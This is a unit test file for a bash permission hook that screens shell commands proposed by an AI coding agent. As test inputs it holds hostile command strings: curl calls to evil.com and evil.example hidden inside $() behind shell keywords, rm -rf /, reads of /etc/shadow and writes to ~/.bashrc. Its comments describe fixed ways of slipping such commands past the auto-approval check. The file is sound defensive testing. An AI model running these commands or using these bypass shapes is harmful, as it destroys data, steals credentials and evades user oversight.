'use strict';
/**
 * bash-hook.test.cjs
 * Unit tests for bash-safety-hook.cjs decomposition, matching, builtins,
 * deny-first logic, settings layer merging, kill switch, and graceful degradation.
 *
 * Test ID prefix: BASH-HOOK-08 through BASH-HOOK-12+ (per CONTEXT.md test plan)
 */

const { describe, test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { spawnSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const { resolveTmpDir, cleanup } = require('./helpers.cjs');

const HOOK_PATH = path.resolve(__dirname, '..', 'hooks', 'bash-safety-hook.cjs');

// Load the hook module for pure function testing
const hook = require(HOOK_PATH);
const {
  splitOnOperators,
  normalizeCommand,
  decomposeCommand,
  commandMatchesPattern,
  parseBashPattern,
  loadMergedSettings,
  decide,
  _skipShellValue,
  isStandaloneAssignment,
  isInsideQuotes,
} = hook;

// ── BASH-HOOK-08: splitOnOperators splits compound bash commands correctly ────

describe('BASH-HOOK-08: splitOnOperators', () => {
  test('splits on && operator', () => {
    const result = splitOnOperators('git status && git diff');
    assert.deepEqual(result, ['git status ', ' git diff']);
  });

  test('splits on ; operator', () => {
    const result = splitOnOperators('git log; git status');
    assert.deepEqual(result, ['git log', ' git status']);
  });

  test('splits on | operator', () => {
    const result = splitOnOperators('cat file | grep pattern');
    assert.deepEqual(result, ['cat file ', ' grep pattern']);
  });

  test('splits on || operator', () => {
    const result = splitOnOperators('test -f foo || echo missing');
    assert.deepEqual(result, ['test -f foo ', ' echo missing']);
  });

  test('does NOT split on && inside single quotes', () => {
    const result = splitOnOperators("echo 'hello && world'");
    assert.deepEqual(result, ["echo 'hello && world'"]);
  });

  test('does NOT split on ; inside double quotes', () => {
    const result = splitOnOperators('echo "hello; world"');
    assert.deepEqual(result, ['echo "hello; world"']);
  });

  test('does NOT split on | inside quotes', () => {
    const result = splitOnOperators("git commit -m 'test | message'");
    assert.deepEqual(result, ["git commit -m 'test | message'"]);
  });

  test('splits multiple operators', () => {
    const result = splitOnOperators('echo a && echo b; echo c');
    assert.ok(result.length === 3, 'should split into 3 parts');
  });

  test('handles simple command with no operators', () => {
    const result = splitOnOperators('git status');
    assert.deepEqual(result, ['git status']);
  });

  test('does NOT split inside $() subshell', () => {
    const result = splitOnOperators('echo $(git status && git diff)');
    // The outer command should not be split — split is only at depth==0
    assert.ok(result.length === 1, 'should not split on && inside $()');
  });

  test('does NOT split inside bare ( ) nested in $()', () => {
    const result = splitOnOperators('$( (echo a; echo b) )');
    assert.equal(result.length, 1,
      'bare parens inside $() must not cause premature depth-0 exit');
  });

  test('handles arithmetic $(( )) without double-increment issues', () => {
    const result = splitOnOperators('echo $(( 1 + 2 ))');
    assert.equal(result.length, 1,
      'arithmetic $(( )) must remain single segment');
  });
});

// ── BASH-HOOK-09: commandMatchesPattern matches Bash(glob) patterns ──────────

describe('BASH-HOOK-09: commandMatchesPattern', () => {
  test('git commit matches Bash(git:*)', () => {
    assert.ok(commandMatchesPattern("git commit -m 'test'", 'Bash(git:*)'));
  });

  test('git status matches Bash(git:*)', () => {
    assert.ok(commandMatchesPattern('git status', 'Bash(git:*)'));
  });

  test('npm run build matches Bash(npm run:*)', () => {
    assert.ok(commandMatchesPattern('npm run build', 'Bash(npm run:*)'));
  });

  test('rm -rf / does NOT match Bash(git:*)', () => {
    assert.ok(!commandMatchesPattern('rm -rf /', 'Bash(git:*)'));
  });

  test('curl http://evil.com does NOT match Bash(git:*)', () => {
    assert.ok(!commandMatchesPattern('curl http://evil.com', 'Bash(git:*)'));
  });

  test('node script.js matches Bash(node:*)', () => {
    assert.ok(commandMatchesPattern('node script.js', 'Bash(node:*)'));
  });

  test('exact match without glob: git status matches Bash(git status)', () => {
    assert.ok(commandMatchesPattern('git status', 'Bash(git status)'));
  });

  test('non-Bash() pattern does not match (not a Bash permission entry)', () => {
    // Non-Bash patterns (e.g. for other tools) should not match bash commands
    assert.ok(!commandMatchesPattern('git status', 'Edit(*.md)'));
  });
});

// ── BASH-HOOK-14: Bug 10 regression — trailing-star patterns match zero-arg commands ──

describe('BASH-HOOK-14: trailing-star patterns match zero-arg commands (Bug 10 fix)', () => {
  test('Bash(echo *) matches bare "echo" (zero args)', () => {
    assert.ok(commandMatchesPattern('echo', 'Bash(echo *)'));
  });

  test('Bash(echo *) still matches "echo hello" (with args)', () => {
    assert.ok(commandMatchesPattern('echo hello', 'Bash(echo *)'));
  });

  test('Bash(gh pr *) matches bare "gh pr" (multi-word zero args)', () => {
    assert.ok(commandMatchesPattern('gh pr', 'Bash(gh pr *)'));
  });

  test('Bash(gh pr *) matches "gh pr list" (multi-word with args)', () => {
    assert.ok(commandMatchesPattern('gh pr list', 'Bash(gh pr *)'));
  });

  test('Bash(gh pr *) does NOT match bare "gh" (partial prefix)', () => {
    assert.ok(!commandMatchesPattern('gh', 'Bash(gh pr *)'));
  });

  test('Bash(npm run *) matches "npm run build" (existing behavior preserved)', () => {
    assert.ok(commandMatchesPattern('npm run build', 'Bash(npm run *)'));
  });

  test('parseBashPattern("Bash(echo *)") returns prefix type (not glob)', () => {
    const parsed = parseBashPattern('Bash(echo *)');
    assert.strictEqual(parsed.type, 'prefix');
    assert.strictEqual(parsed.prefix, 'echo');
  });

  test('parseBashPattern("Bash(*.sh)") returns glob type (non-trailing-star unaffected)', () => {
    const parsed = parseBashPattern('Bash(*.sh)');
    assert.strictEqual(parsed.type, 'glob');
  });
});

// ── BASH-HOOK-10: compound all-match -> approve ───────────────────────────────

describe('BASH-HOOK-10: compound all-match -> approve', () => {
  test('git status && git diff with allow=[Bash(git:*)] -> approve', () => {
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('git status && git diff', settings);
    assert.equal(result.decision, 'allow');
  });

  test('cd /tmp && git status with allow=[Bash(cd:*), Bash(git:*)] -> approve', () => {
    const settings = { permissions: { allow: ['Bash(cd:*)', 'Bash(git:*)'], deny: [] } };
    const result = decide('cd /tmp && git status', settings);
    assert.equal(result.decision, 'allow');
  });

  test('echo hello && printf world with both allowlisted -> approve', () => {
    const settings = { permissions: { allow: ['Bash(echo:*)', 'Bash(printf:*)'], deny: [] } };
    const result = decide('echo hello && printf world', settings);
    assert.equal(result.decision, 'allow');
  });

  test('approve returns reason string', () => {
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('git status', settings);
    assert.equal(result.decision, 'allow');
    assert.ok(typeof result.reason === 'string' && result.reason.length > 0);
  });
});

// ── BASH-HOOK-11: compound partial-match -> fall through ─────────────────────

describe('BASH-HOOK-11: compound partial-match -> passthrough', () => {
  test('git status && curl http://evil.com with allow=[Bash(git:*)] -> passthrough', () => {
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('git status && curl http://evil.com', settings);
    assert.equal(result.decision, 'passthrough');
  });

  test('single unallowed command with no match -> passthrough', () => {
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('curl http://example.com', settings);
    assert.equal(result.decision, 'passthrough');
  });

  test('passthrough has no reason (falls through to Claude Code normal prompting)', () => {
    const settings = { permissions: { allow: [], deny: [] } };
    const result = decide('curl http://example.com', settings);
    assert.equal(result.decision, 'passthrough');
  });

  test('one unmatched sub-command means no auto-approval', () => {
    const settings = { permissions: { allow: ['Bash(npm:*)'], deny: [] } };
    const result = decide('npm install && curl https://example.com', settings);
    assert.equal(result.decision, 'passthrough');
  });
});

// ── BASH-HOOK-12: reads allowlist from all 4 settings layers ─────────────────

describe('BASH-HOOK-12: reads allowlist from all 4 settings layers', () => {
  const BASE_TMPDIR = resolveTmpDir();

  test('merges allow patterns from layer 1 (global settings) and layer 3 (project settings)', () => {
    const tmpDir = fs.mkdtempSync(path.join(BASE_TMPDIR, 'gsd-hook-test-'));
    try {
      // Layer 1: global settings ($CLAUDE_SETTINGS_PATH)
      const globalSettingsPath = path.join(tmpDir, 'global-settings.json');
      fs.writeFileSync(globalSettingsPath, JSON.stringify({
        permissions: { allow: ['Bash(git:*)'], deny: [] }
      }));

      // Layer 3: project settings ($CLAUDE_PROJECT_DIR/.claude/settings.json)
      const projectClaudeDir = path.join(tmpDir, 'project', '.claude');
      fs.mkdirSync(projectClaudeDir, { recursive: true });
      fs.writeFileSync(path.join(projectClaudeDir, 'settings.json'), JSON.stringify({
        permissions: { allow: ['Bash(npm:*)'], deny: [] }
      }));

      const settings = loadMergedSettings({
        CLAUDE_SETTINGS_PATH: globalSettingsPath,
        CLAUDE_PROJECT_DIR: path.join(tmpDir, 'project'),
      });

      // Both allow patterns should be present
      assert.ok(settings.permissions.allow.includes('Bash(git:*)'), 'Layer 1 Bash(git:*) should be present');
      assert.ok(settings.permissions.allow.includes('Bash(npm:*)'), 'Layer 3 Bash(npm:*) should be present');
    } finally {
      cleanup(tmpDir);
    }
  });

  test('merges allow patterns from all 4 layers without duplicates', () => {
    const tmpDir = fs.mkdtempSync(path.join(BASE_TMPDIR, 'gsd-hook-test-'));
    try {
      // Layer 1: $CLAUDE_SETTINGS_PATH
      const globalSettingsPath = path.join(tmpDir, 'settings.json');
      fs.writeFileSync(globalSettingsPath, JSON.stringify({
        permissions: { allow: ['Bash(git:*)'], deny: [] }
      }));

      // Layer 2: ~/.claude/settings.local.json — simulated via project-local
      const homeClaudeDir = path.join(tmpDir, 'home', '.claude');
      fs.mkdirSync(homeClaudeDir, { recursive: true });
      fs.writeFileSync(path.join(homeClaudeDir, 'settings.local.json'), JSON.stringify({
        permissions: { allow: ['Bash(curl:*)'], deny: [] }
      }));

      // Layer 3: $CLAUDE_PROJECT_DIR/.claude/settings.json
      const projectClaudeDir = path.join(tmpDir, 'project', '.claude');
      fs.mkdirSync(projectClaudeDir, { recursive: true });
      fs.writeFileSync(path.join(projectClaudeDir, 'settings.json'), JSON.stringify({
        permissions: { allow: ['Bash(npm:*)'], deny: [] }
      }));

      // Layer 4: $CLAUDE_PROJECT_DIR/.claude/settings.local.json
      fs.writeFileSync(path.join(projectClaudeDir, 'settings.local.json'), JSON.stringify({
        permissions: { allow: ['Bash(node:*)'], deny: [] }
      }));

      const settings = loadMergedSettings({
        CLAUDE_SETTINGS_PATH: globalSettingsPath,
        CLAUDE_PROJECT_DIR: path.join(tmpDir, 'project'),
        HOME: path.join(tmpDir, 'home'),
      });

      assert.ok(settings.permissions.allow.includes('Bash(git:*)'), 'Layer 1 should be merged');
      assert.ok(settings.permissions.allow.includes('Bash(curl:*)'), 'Layer 2 should be merged');
      assert.ok(settings.permissions.allow.includes('Bash(npm:*)'), 'Layer 3 should be merged');
      assert.ok(settings.permissions.allow.includes('Bash(node:*)'), 'Layer 4 should be merged');
    } finally {
      cleanup(tmpDir);
    }
  });

  test('missing settings files are silently skipped (no crash)', () => {
    assert.doesNotThrow(() => {
      loadMergedSettings({
        CLAUDE_SETTINGS_PATH: '/nonexistent/settings.json',
        CLAUDE_PROJECT_DIR: '/nonexistent/project',
      });
    });
  });

  test('malformed JSON in settings file is silently skipped', () => {
    const tmpDir = fs.mkdtempSync(path.join(BASE_TMPDIR, 'gsd-hook-test-'));
    try {
      const badSettingsPath = path.join(tmpDir, 'settings.json');
      fs.writeFileSync(badSettingsPath, 'NOT VALID JSON {{{');

      assert.doesNotThrow(() => {
        loadMergedSettings({ CLAUDE_SETTINGS_PATH: badSettingsPath });
      });
    } finally {
      cleanup(tmpDir);
    }
  });
});

// ── BASH-HOOK-NO-BUILTINS: builtins require explicit allowlist ────────────────
// Regression tests for the SAFE_BUILTINS removal. Previously, builtins like
// echo, cd, read were auto-approved without any allowlist entry. Combined with
// redirection stripping, this allowed `echo "x" > ~/.bashrc` to be auto-approved.
// Now builtins go through the same allowlist path as everything else.

describe('BASH-HOOK-NO-BUILTINS: builtins are NOT auto-approved without allowlist', () => {
  const noSettings = { permissions: { allow: [], deny: [] } };

  test('echo hello -> passthrough without allowlist', () => {
    const result = decide('echo hello', noSettings);
    assert.equal(result.decision, 'passthrough',
      'echo must not be auto-approved without explicit allowlist entry');
  });

  test('cd /tmp -> passthrough without allowlist', () => {
    const result = decide('cd /tmp', noSettings);
    assert.equal(result.decision, 'passthrough',
      'cd must not be auto-approved without explicit allowlist entry');
  });

  test('echo "x" > ~/.bashrc -> passthrough (redirection bypass blocked)', () => {
    const result = decide('echo "x" > ~/.bashrc', noSettings);
    assert.equal(result.decision, 'passthrough',
      'echo with redirection must not be auto-approved');
  });

  test('read var < /etc/shadow -> passthrough (redirection bypass blocked)', () => {
    const result = decide('read var < /etc/shadow', noSettings);
    assert.equal(result.decision, 'passthrough',
      'read with redirection must not be auto-approved');
  });

  test('echo hello -> approve WITH explicit allowlist', () => {
    const settings = { permissions: { allow: ['Bash(echo:*)'], deny: [] } };
    const result = decide('echo hello', settings);
    assert.equal(result.decision, 'allow',
      'echo must be approved when explicitly allowlisted');
  });
});

// ── Additional: Deny-first logic ──────────────────────────────────────────────

describe('BASH-HOOK-DENY-FIRST: deny patterns take precedence over allow patterns', () => {
  test('rm -rf / denied despite allow=[Bash(rm:*)]', () => {
    const settings = {
      permissions: {
        allow: ['Bash(rm:*)'],
        deny: ['Bash(rm -rf:*)'],
      },
    };
    const result = decide('rm -rf /', settings);
    assert.equal(result.decision, 'deny');
  });

  test('deny returns a reason string', () => {
    const settings = {
      permissions: {
        allow: ['Bash(rm:*)'],
        deny: ['Bash(rm -rf:*)'],
      },
    };
    const result = decide('rm -rf /', settings);
    assert.equal(result.decision, 'deny');
    assert.ok(typeof result.reason === 'string' && result.reason.length > 0);
  });

  test('deny check applies to each sub-command in compound command', () => {
    const settings = {
      permissions: {
        allow: ['Bash(git:*)', 'Bash(rm:*)'],
        deny: ['Bash(rm -rf:*)'],
      },
    };
    const result = decide('git status && rm -rf /tmp/test', settings);
    assert.equal(result.decision, 'deny');
  });
});

// ── Additional: Normalization ─────────────────────────────────────────────────

describe('BASH-HOOK-NORMALIZE: command normalization', () => {
  test('env var prefix stripped: EDITOR=vim git commit -> git commit', () => {
    const normalized = normalizeCommand('EDITOR=vim git commit');
    assert.ok(normalized.startsWith('git commit'), `got: "${normalized}"`);
  });

  test('redirection stripped: git status > /dev/null -> git status', () => {
    const normalized = normalizeCommand('git status > /dev/null');
    assert.ok(normalized.trim() === 'git status', `got: "${normalized}"`);
  });

  test('do keyword prefix stripped: do git status -> git status', () => {
    const normalized = normalizeCommand('do git status');
    assert.ok(normalized.startsWith('git status'), `got: "${normalized}"`);
  });

  test('standalone assignment filtered out (not a command)', () => {
    const cmds = decomposeCommand('FOO=bar');
    assert.equal(cmds.length, 0, 'standalone assignment should be filtered');
  });

  test('done keyword filtered out (structural keyword)', () => {
    const cmds = decomposeCommand('done');
    assert.equal(cmds.length, 0, 'structural keyword "done" should be filtered');
  });

  test('fi keyword filtered out', () => {
    const cmds = decomposeCommand('fi');
    assert.equal(cmds.length, 0, 'structural keyword "fi" should be filtered');
  });

  test('true keyword filtered out (nullary builtin, structural)', () => {
    const cmds = decomposeCommand('true');
    assert.equal(cmds.length, 0, 'structural keyword "true" should be filtered');
  });

  test('false keyword filtered out (nullary builtin, structural)', () => {
    const cmds = decomposeCommand('false');
    assert.equal(cmds.length, 0, 'structural keyword "false" should be filtered');
  });

  test('cmd || true does not force passthrough on true sub-command', () => {
    // Common idiom: decomposes into ["git status", "true"]. 'true' is structural
    // so it gets filtered and the decide() result depends only on "git status".
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('git status || true', settings);
    assert.equal(result.decision, 'allow',
      'hook must allow `cmd || true` when cmd is allowed; got: ' + JSON.stringify(result));
  });

  test('true $(...) does NOT bypass subshell extraction', () => {
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('git status || true $(curl https://evil.example)', settings);
    assert.notEqual(result.decision, 'allow',
      'hook must NOT auto-approve `git status || true $(curl ...)` — inner curl is not allowlisted; got: ' + JSON.stringify(result));
  });

  test('bare true $(...) does NOT bypass subshell extraction', () => {
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('true $(curl https://evil.example)', settings);
    assert.notEqual(result.decision, 'allow',
      'hook must NOT auto-approve `true $(curl ...)`; got: ' + JSON.stringify(result));
  });

  test('false $(...) does NOT bypass subshell extraction', () => {
    const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
    const result = decide('git status || false $(curl https://evil.example)', settings);
    assert.notEqual(result.decision, 'allow',
      'hook must NOT auto-approve `... || false $(curl ...)`; got: ' + JSON.stringify(result));
  });

  test('exit is NOT filtered structurally (allowlist-only) so subshell args get checked', () => {
    // exit/return/local/export can wrap $() and MUST reach subshell extraction.
    // Here we verify the outer `exit` is NOT filtered out — if it were, a
    // sibling-less filter would let decide() return allow/passthrough without
    // having matched anything, silently accepting.
    const cmds = decomposeCommand('exit 1');
    assert.ok(cmds.length > 0,
      '"exit 1" must not be structurally filtered — it belongs to the allowlist path');
    assert.ok(cmds.some(c => c.startsWith('exit')),
      'decomposed output must contain the exit sub-command; got: ' + JSON.stringify(cmds));
  });

  test('local X=$(cmd) extracts inner command (decision != allow when inner not allowlisted)', () => {
    // Security property: `local X=$(curl ...)` is a `local` builtin
    // invocation (not a standalone assignment — isStandaloneAssignment
    // only matches bare `NAME=value` at the start of a normalized
    // command). With only `Bash(local:*)` allowlisted, the outer
    // `local X=...` matches the allowlist, but extractSubshells() runs
    // on the raw part before the allowlist check and surfaces the
    // inner `curl` for its own allow/deny evaluation. Since curl is
    // not allowlisted, the overall decision must NOT be 'allow'.
    const settings = {
      permissions: { allow: ['Bash(local:*)'], deny: [] },
    };
    const result = decide('local X=$(curl https://evil.example/data)', settings);
    assert.notEqual(result.decision, 'allow',
      'hook must NOT auto-approve local X=$(curl ...) when curl is not allowlisted; got: ' + JSON.stringify(result));
  });
});

// ── Additional: keyword-wraps-subshell bypass class ──────────────────────────

describe('BASH-HOOK-CLASS-INVARIANT: subshell args bypass structural filter regardless of keyword', () => {
  // Invariant under test (enforced by decomposeCommand): extractSubshells()
  // runs on every rawPart BEFORE structural/compound-header/assignment
  // filters, so a structural keyword like `then`, `else`, `elif`, `do`,
  // `break`, or `continue` wrapping a $() argument cannot silently bypass
  // allow/deny. The six uniform tests prove this property holds across
  // the keyword set; two sibling-allowlisted tests (below) exercise the
  // specific shape where a sibling sub-command is allowlisted — the
  // concrete manifestation that makes the bypass directly observable
  // as `decision === 'allow'` rather than merely `passthrough`.

  const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };

  test('then $(...) does NOT bypass (keyword: then)', () => {
    const result = decide('if true; then $(curl https://evil.example); fi', settings);
    assert.notEqual(result.decision, 'allow',
      'then $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });

  test('else $(...) does NOT bypass (keyword: else)', () => {
    const result = decide('if false; else $(curl https://evil.example); fi', settings);
    assert.notEqual(result.decision, 'allow',
      'else $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });

  test('elif $(...) does NOT bypass (keyword: elif)', () => {
    const result = decide('if x; elif $(curl https://evil.example); then y; fi', settings);
    assert.notEqual(result.decision, 'allow',
      'elif $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });

  test('do $(...) does NOT bypass (keyword: do)', () => {
    const result = decide('while x; do $(curl https://evil.example); done', settings);
    assert.notEqual(result.decision, 'allow',
      'do $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });

  test('break $(...) does NOT bypass (keyword: break)', () => {
    const result = decide('for i in a b; do echo $i; break $(curl https://evil.example); done', settings);
    assert.notEqual(result.decision, 'allow',
      'break $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });

  test('continue $(...) does NOT bypass (keyword: continue)', () => {
    const result = decide('for i in a b; do echo $i; continue $(curl https://evil.example); done', settings);
    assert.notEqual(result.decision, 'allow',
      'continue $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });

  // Concrete-bypass demonstrations: with a sibling allowlisted command, the
  // pre-fix decomposer silently filtered the `break $(curl ...)` /
  // `continue $(curl ...)` part out entirely, leaving only `git status` —
  // which hits the allowlist and returns `allow`. These two tests fail
  // before the decompose-loop reorder.
  test('CONCRETE BYPASS: git status; break $(curl ...) must not allow', () => {
    const result = decide('git status; break $(curl https://evil.example)', settings);
    assert.notEqual(result.decision, 'allow',
      'sibling-allowlisted break $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });

  test('CONCRETE BYPASS: git status; continue $(curl ...) must not allow', () => {
    const result = decide('git status; continue $(curl https://evil.example)', settings);
    assert.notEqual(result.decision, 'allow',
      'sibling-allowlisted continue $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
  });
});

// ── Additional: Heredoc stripping ────────────────────────────────────────────

describe('BASH-HOOK-HEREDOC: heredoc body lines are not treated as sub-commands', () => {
  const { stripHeredocs } = hook;

  test('stripHeredocs removes heredoc body lines', () => {
    const input = 'cat <<EOF\nhello world\nrm -rf /\nEOF';
    const result = stripHeredocs(input);
    assert.ok(!result.includes('rm -rf /'), 'heredoc body must be stripped');
    assert.ok(result.includes('cat <<EOF'), 'heredoc marker line must be preserved');
  });

  test('stripHeredocs handles quoted delimiter', () => {
    const input = "cat <<'EOF'\nsome body\nEOF";
    const result = stripHeredocs(input);
    assert.ok(!result.includes('some body'), 'heredoc body with quoted delim must be stripped');
  });

  test('stripHeredocs handles <<- (indented) heredoc', () => {
    const input = 'cat <<-DELIM\n\tindented body\nDELIM';
    const result = stripHeredocs(input);
    assert.ok(!result.includes('indented body'), 'indented heredoc body must be stripped');
  });

  test('stripHeredocs handles delimiter with hyphen (EOF-1)', () => {
    const input = 'cat <<EOF-1\nheredoc body\nEOF-1';
    const result = stripHeredocs(input);
    assert.ok(!result.includes('heredoc body'), 'heredoc body with hyphenated delim must be stripped');
    assert.ok(result.includes('cat <<EOF-1'), 'heredoc marker line must be preserved');
  });

  test('stripHeredocs handles delimiter with dot (END.TXT)', () => {
    const input = 'cat <<END.TXT\nheredoc body\nEND.TXT';
    const result = stripHeredocs(input);
    assert.ok(!result.includes('heredoc body'), 'heredoc body with dotted delim must be stripped');
    assert.ok(result.includes('cat <<END.TXT'), 'heredoc marker line must be preserved');
  });

  test('stripHeredocs passes through commands without heredocs', () => {
    const input = 'git status && git diff';
    const result = stripHeredocs(input);
    assert.equal(result, input, 'non-heredoc commands must be unchanged');
  });

  test('heredoc body with deny-pattern text does not cause false deny', () => {
    const settings = {
      permissions: {
        allow: ['Bash(cat:*)'],
        deny: ['Bash(rm -rf:*)'],
      },
    };
    // The "rm -rf /" is inside a heredoc body -- it's data, not a command
    const result = decide('cat <<EOF\nrm -rf /\nEOF', settings);
    // Should NOT deny -- the rm -rf is heredoc content, not a real command
    assert.notEqual(result.decision, 'deny',
      'heredoc body text must not trigger deny patterns');
  });

  test('command after heredoc is still checked', () => {
    const settings = { permissions: { allow: ['Bash(cat:*)'], deny: [] } };
    // cat with heredoc should be allowed -- cat is the actual command
    const result = decide('cat <<EOF\nhello\nEOF', settings);
    assert.equal(result.decision, 'allow');
  });

  test('stripHeredocs does NOT strip when << is inside double quotes', () => {
    const input = 'echo "not a heredoc <<EOF"\nrm -rf /\nEOF';
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<< inside double quotes must NOT trigger heredoc stripping');
    assert.ok(result.includes('EOF'),
      'EOF line must be preserved when << was inside quotes');
  });

  test('stripHeredocs does NOT strip when << is inside single quotes', () => {
    const input = "echo 'text <<EOF'\nrm -rf /\nEOF";
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<< inside single quotes must NOT trigger heredoc stripping');
  });

  test('stripHeredocs still strips real heredocs after quoted << on different line', () => {
    const input = 'echo "has <<EOF in quotes"\ncat <<REAL\nheredoc body\nREAL';
    const result = stripHeredocs(input);
    assert.ok(result.includes('echo "has <<EOF in quotes"'),
      'quoted << line must be preserved');
    assert.ok(!result.includes('heredoc body'),
      'real heredoc on subsequent line must still be stripped');
  });
});

// ── BASH-HOOK-HERESTRING: here-strings (<<<) must NOT be treated as heredocs ─
// Regression tests for the <<<-vs-<< bypass. Without (?<!<)<<(?!<) in
// stripHeredocs, the regex can match the 2nd+3rd '<' of '<<<' as a valid '<<',
// causing subsequent lines to be silently dropped from analysis — an
// auto-approval bypass (e.g. `cat <<<"$x"\nrm -rf /` drops the rm line).

describe('BASH-HOOK-HERESTRING: here-strings must not trigger heredoc stripping', () => {
  const { stripHeredocs } = hook;

  test('here-string with double-quoted value does not eat next line', () => {
    const input = 'cat <<<"$x"\nrm -rf /';
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<<< must not trigger heredoc — rm -rf / must survive');
  });

  test('here-string with bare word does not eat next line', () => {
    const input = 'cat <<<word\nrm -rf /';
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<<<word must not trigger heredoc — rm -rf / must survive');
  });

  test('here-string with single-quoted value does not eat next line', () => {
    const input = "cat <<<'word'\nrm -rf /";
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      "<<<'word' must not trigger heredoc — rm -rf / must survive");
  });

  test('here-string with space does not eat next line', () => {
    const input = 'cat <<< word\nrm -rf /';
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<<< word must not trigger heredoc — rm -rf / must survive');
  });

  test('four angle brackets does not trigger heredoc', () => {
    const input = '<<<<\nrm -rf /';
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<<<< must not trigger heredoc — rm -rf / must survive');
  });

  test('here-string on same line as real heredoc: only heredoc strips', () => {
    const input = 'cat <<<x\ncmd <<EOF\nheredoc body\nEOF\necho done';
    const result = stripHeredocs(input);
    assert.ok(result.includes('cat <<<x'),
      'here-string line must be preserved');
    assert.ok(!result.includes('heredoc body'),
      'real heredoc body must be stripped');
    assert.ok(result.includes('echo done'),
      'line after heredoc terminator must survive');
  });

  test('here-string with non-word value (<<<EOF-1) does not eat next line', () => {
    const input = 'cat <<<EOF-1\nrm -rf /';
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<<<EOF-1 must not trigger heredoc — rm -rf / must survive');
  });

  test('here-string with dotted value (<<<END.TXT) does not eat next line', () => {
    const input = 'cat <<<END.TXT\nrm -rf /';
    const result = stripHeredocs(input);
    assert.ok(result.includes('rm -rf /'),
      '<<<END.TXT must not trigger heredoc — rm -rf / must survive');
  });
});

// ── BASH-HOOK-SUBSHELL-DEPTH: $() must not prevent operator splitting ────────
// Regression tests for the $( depth double-count porting bug. The Python
// upstream consumes $( as a unit (i += 2); the JS port originally used i++,
// leaving ( for re-processing by the bare-paren handler → depth double-
// incremented → operators after $() never split → security bypass.

describe('BASH-HOOK-SUBSHELL-DEPTH: $() followed by operators must split correctly', () => {
  test('$() then && splits into two segments', () => {
    const result = splitOnOperators('echo $(git status) && rm -rf /');
    assert.equal(result.length, 2, 'must split on && after $()');
    assert.ok(result[0].includes('echo $(git status)'));
    assert.ok(result[1].includes('rm -rf /'));
  });

  test('$() then ; splits into two segments', () => {
    const result = splitOnOperators('echo $(date); rm -rf /');
    assert.equal(result.length, 2, 'must split on ; after $()');
  });

  test('nested $() then && splits correctly', () => {
    const result = splitOnOperators('echo $(echo $(whoami)) && rm -rf /');
    assert.equal(result.length, 2, 'must split on && after nested $()');
  });

  test('multiple $() then && splits correctly', () => {
    const result = splitOnOperators('echo $(a) $(b) && rm -rf /');
    assert.equal(result.length, 2, 'must split on && after multiple $()');
  });

  test('$() in assignment context then && splits correctly', () => {
    const result = splitOnOperators('FOO=$(git status) && rm -rf /');
    assert.equal(result.length, 2, 'must split on && after $() in assignment');
  });

  test('$() with allowlisted commands does NOT auto-approve chained dangerous command', () => {
    const settings = { permissions: { allow: ['Bash(echo:*)', 'Bash(git:*)'], deny: [] } };
    const result = decide('echo $(git status) && rm -rf /', settings);
    assert.ok(result.decision !== 'allow',
      'echo $(git status) && rm -rf / must NOT be auto-approved');
  });
});

// ── Additional: isInsideQuotes helper ────────────────────────────────────────

describe('isInsideQuotes helper', () => {
  test('detects position inside double quotes', () => {
    assert.ok(isInsideQuotes('echo "hello << world"', 14));
  });
  test('detects position inside single quotes', () => {
    assert.ok(isInsideQuotes("echo 'hello << world'", 14));
  });
  test('returns false for position outside quotes', () => {
    assert.ok(!isInsideQuotes('echo hello << world', 13));
  });
});

// ── Additional: Graceful degradation ─────────────────────────────────────────

describe('BASH-HOOK-GRACEFUL: hook process graceful degradation', () => {
  let hermetic_home;

  // Create an isolated HOME so developer's ~/.claude/settings*.json can't leak
  before(() => {
    hermetic_home = fs.mkdtempSync(path.join(resolveTmpDir(), 'gsd-hook-home-'));
  });
  after(() => {
    cleanup(hermetic_home);
  });

  function runHook(stdin, env = {}) {
    const mergedEnv = Object.assign({}, process.env, { HOME: hermetic_home }, env);
    const result = spawnSync(process.execPath, [HOOK_PATH], {
      input: stdin,
      encoding: 'utf8',
      timeout: 5000,
      env: mergedEnv,
    });
    return result;
  }

  test('malformed JSON input -> exit 0 (no crash)', () => {
    const result = runHook('NOT VALID JSON');
    assert.equal(result.status, 0, 'hook must exit 0 on malformed JSON');
  });

  test('empty stdin -> exit 0 (no crash)', () => {
    const result = runHook('');
    assert.equal(result.status, 0, 'hook must exit 0 on empty input');
  });

  test('GSD_DISABLE_BASH_HOOK=1 -> immediate exit 0 (no output)', () => {
    const validInput = JSON.stringify({
      tool_name: 'Bash',
      tool_input: { command: 'git status' },
    });
    const result = runHook(validInput, { GSD_DISABLE_BASH_HOOK: '1' });
    assert.equal(result.status, 0, 'kill switch must exit 0');
    assert.equal(result.stdout, '', 'kill switch must produce no output');
  });

